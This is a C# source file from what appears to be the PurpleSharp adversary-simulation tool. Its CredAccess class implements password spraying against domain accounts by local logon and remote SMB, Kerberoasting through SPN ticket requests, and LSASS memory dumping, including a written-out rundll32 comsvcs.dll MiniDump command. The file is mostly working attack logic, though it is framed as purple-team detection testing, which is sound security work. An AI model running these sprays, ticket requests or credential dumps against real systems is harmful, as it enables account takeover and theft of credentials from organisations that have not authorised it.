using PurpleSharp.Lib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TaskScheduler;

namespace PurpleSharp.Simulations
{
    public class CredAccess
    {

        public static void LocalDomainPasswordSpray(PlaybookTask playbook_task, string log)
        {

            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1110.003");
            logger.TimestampInfo(String.Format("Local Domain Brute Force using the LogonUser Win32 API function"));
            logger.TimestampInfo(String.Format("Using {0}", playbook_task.protocol));
            try
            {
                List<User> usertargets = Targets.GetUserTargets(playbook_task, logger) ;

                if (playbook_task.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", playbook_task.task_sleep));
                String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                //if (playbook_task.user_target_type == 6) domain = ".";

                foreach (var user in usertargets)
                {
                    if (playbook_task.protocol.ToUpper().Equals("KERBEROS"))
                    {
                        CredAccessHelper.LogonUser(user.UserName, domain, playbook_task.spray_password, 2, 0, logger);
                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                    }
                    else
                    {
                        CredAccessHelper.LogonUser(user.UserName, domain, playbook_task.spray_password, 2, 2, logger);
                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                    }
                }
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }

        public static void RemoteDomainPasswordSpray(PlaybookTask playbook_task, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1110.003");
            logger.TimestampInfo(String.Format("Remote Domain Brute Force using the WNetAddConnection2 Win32 API function"));
            bool Kerberos = false;
            List<Computer> host_targets = new List<Computer>();
            List<User> user_targets = new List<User>();
            List<Task> tasklist = new List<Task>();
            string domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;

            try
            {
                if (playbook_task.user_target_type == 99) domain = ".";
                // Executing a remote authentication with Kerberos will not connect to the remote host, just the DC.
                Kerberos = false;

                host_targets = Targets.GetHostTargets(playbook_task, logger);
                user_targets = Targets.GetUserTargets(playbook_task, logger);
                //if (playbook_task.protocol.ToUpper().Equals("NTLM")) Kerberos = false;
                if (playbook_task.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", playbook_task.task_sleep));

                if (playbook_task.host_target_type == 1 || playbook_task.host_target_type == 2)
                {
                    //Remote spray against one target host
                    //Target host either explictly defined in the playbook or randomly picked using LDAP queries
                    foreach (User user in user_targets)
                    { 
                        User tempuser = user;
                        //int tempindex = index;
                        //if (playbook_task.task_sleep > 0 && tempindex > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                        if (playbook_task.task_sleep > 0 ) Thread.Sleep(playbook_task.task_sleep * 1000);
                        tasklist.Add(Task.Factory.StartNew(() =>
                        {
                            CredAccessHelper.RemoteSmbLogin(host_targets[0], domain, tempuser.UserName, playbook_task.spray_password, Kerberos, logger);
                        }));
                    }
                    Task.WaitAll(tasklist.ToArray());

                }
                
                else if (playbook_task.host_target_type == 3 || playbook_task.host_target_type == 4)
                {
                    //Remote spray against several hosts, distributed
                    //Target hosts either explictly defined in the playbook or randomly picked using LDAP queries
                    int loops;
                    if (user_targets.Count >= host_targets.Count) loops = host_targets.Count;
                    else loops = user_targets.Count;

                    for (int i = 0; i < loops; i++)
                    {
                        int temp = i;
                        if (playbook_task.task_sleep > 0 && temp > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                        tasklist.Add(Task.Factory.StartNew(() =>
                        {
                            CredAccessHelper.RemoteSmbLogin(host_targets[temp], domain, user_targets[temp].UserName, playbook_task.spray_password, Kerberos, logger);

                        }));
                    }
                    Task.WaitAll(tasklist.ToArray());
                }
                
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }
        
        public static void Kerberoasting(PlaybookTask playbook_task, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1558.003");
            List<String> servicePrincipalNames;

            if (playbook_task.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between each service ticket request", playbook_task.task_sleep));

            try
            {
                logger.TimestampInfo(String.Format("Querying LDAP for Service Principal Names..."));
                servicePrincipalNames = Ldap.GetSPNs();
                logger.TimestampInfo(String.Format("Found {0} SPNs", servicePrincipalNames.Count));


                if (playbook_task.variation == 1)
                {
                    logger.TimestampInfo(String.Format("Requesting a service ticket for all the {0} identified SPNs", servicePrincipalNames.Count));
                    foreach (String spn in servicePrincipalNames)
                    {
                        SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                    }
                    logger.SimulationFinished();

                }
                else if (playbook_task.variation == 2)
                {
                    var random = new Random();
                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} random SPNs", playbook_task.user_target_total));

                    for (int i = 0; i< playbook_task.user_target_total;i++)
                    {
                        int index = random.Next(servicePrincipalNames.Count);
                        SharpRoast.GetDomainSPNTicket(servicePrincipalNames[index].Split('#')[0], servicePrincipalNames[index].Split('#')[1], "", "", logger);
                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                    }
                    logger.SimulationFinished();
                }
                else if (playbook_task.variation == 3)
                {
                    var random = new Random();
                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} defined SPNs", playbook_task.user_targets.Length));

                    foreach ( string spn in playbook_task.user_targets)
                    {
                        SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
                    }
                    logger.SimulationFinished();
                }

            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }

        }
        public static void LsassMemoryDumpWinApi(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1003.001");
            try
            {
                CredAccessHelper.LsassMemoryDump(logger);
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

        public static void LsassMemoryDumpRundll32(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Logger logger = new Logger(currentPath + log);
            logger.SimulationHeader("T1003.001");
            try
            {
                Process proc = Process.GetProcessesByName("lsass")[0];
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1}", proc.ProcessName, proc.Id));
                ExecutionHelper.StartProcessApi("", String.Format("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump {0} lsass.dmp full", proc.Id), logger);
                logger.SimulationFinished();
            }
            catch (Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }

    }
}

